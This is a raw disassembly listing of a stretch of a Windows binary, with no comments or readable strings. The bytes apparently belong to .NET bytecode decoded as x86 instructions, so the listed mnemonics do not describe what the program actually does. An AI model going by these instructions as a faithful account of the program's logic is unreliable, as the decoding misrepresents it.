  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 32       	add    $0x32720511,%eax
  4031ba:	22 00                	and    (%eax),%al
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 3a 22       	and    $0x223a7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 a4    	or     -0x5b8de7db(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 b6    	or     -0x498de5db(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 ca             	or     -0x36(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 28             	or     0x28(%edx),%dh
  403246:	23 00                	and    (%eax),%eax
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 28             	or     0x28(%edx),%dh
  403251:	23 00                	and    (%eax),%eax
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 2c                	jb     0x4032ef
  4032c3:	23 00                	and    (%eax),%eax
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 36             	or     %esi,0x36(%edx)
  4032da:	23 00                	and    (%eax),%eax
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 4a                	jb     0x403330
  4032e6:	23 00                	and    (%eax),%eax
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 6a                	jb     0x40335c
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 28             	or     0x28(%edx),%dh
  4032fd:	23 00                	and    (%eax),%eax
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 80                	jb     0x40328e
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 88                	jb     0x4032ac
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 94                	jb     0x4032c4
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 a4                	jb     0x403411
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 aa             	adc    %esi,-0x56(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 f0 23    	or     0x23f07209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	0a 24 00             	or     (%eax,%eax,1),%ah
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 36             	or     %esi,0x36(%edx)
  4034fc:	24 00                	and    $0x0,%al
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 42             	or     0x42(%edx),%dh
  403510:	24 00                	and    $0x0,%al
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	52                   	push   %edx
  403521:	24 00                	and    $0x0,%al
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 36                	jb     0x403567
  403531:	24 00                	and    $0x0,%al
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 60             	or     0x60(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 76             	adc    %esi,0x76(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
